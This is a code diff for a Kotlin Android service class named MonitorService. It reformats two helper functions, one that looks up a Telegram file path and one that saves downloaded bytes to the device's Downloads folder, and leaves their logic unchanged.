@@ -898,29 +898,33 @@ class MonitorService : LifecycleService() {
         }
     }
 
-    private fun getTelegramFilePath(fileId: String): String? = try {
-        val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build()).execute().use { it.body?.string() } ?: return null
-        val json = JSONObject(body)
-        if (!json.optBoolean("ok", false)) null else json.optJSONObject("result")?.optString("file_path")
-    } catch (_: Exception) { null }
+    private fun getTelegramFilePath(fileId: String): String? {
+        return try {
+            val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build()).execute().use { it.body?.string() } ?: return null
+            val json = JSONObject(body)
+            if (!json.optBoolean("ok", false)) null else json.optJSONObject("result")?.optString("file_path")
+        } catch (_: Exception) { null }
+    }
 
-    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean = try {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val values = ContentValues().apply {
-                put(MediaStore.Downloads.DISPLAY_NAME, fileName)
-                put(MediaStore.Downloads.MIME_TYPE, mimeType)
-                put(MediaStore.Downloads.IS_PENDING, 1)
+    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val values = ContentValues().apply {
+                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
+                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
+                    put(MediaStore.Downloads.IS_PENDING, 1)
+                }
+                val uri = contentResolver.insert(MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), values) ?: return false
+                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
+                values.clear(); values.put(MediaStore.Downloads.IS_PENDING, 0)
+                contentResolver.update(uri, values, null, null)
+            } else {
+                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                dir.mkdirs(); File(dir, fileName).writeBytes(bytes)
             }
-            val uri = contentResolver.insert(MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), values) ?: return false
-            contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
-            values.clear(); values.put(MediaStore.Downloads.IS_PENDING, 0)
-            contentResolver.update(uri, values, null, null)
-        } else {
-            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-            dir.mkdirs(); File(dir, fileName).writeBytes(bytes)
-        }
-        true
-    } catch (_: Exception) { false }
+            true
+        } catch (_: Exception) { false }
+    }
 
     // ══════════════════════════════════════════════════════════════════════════
     //  ZIP
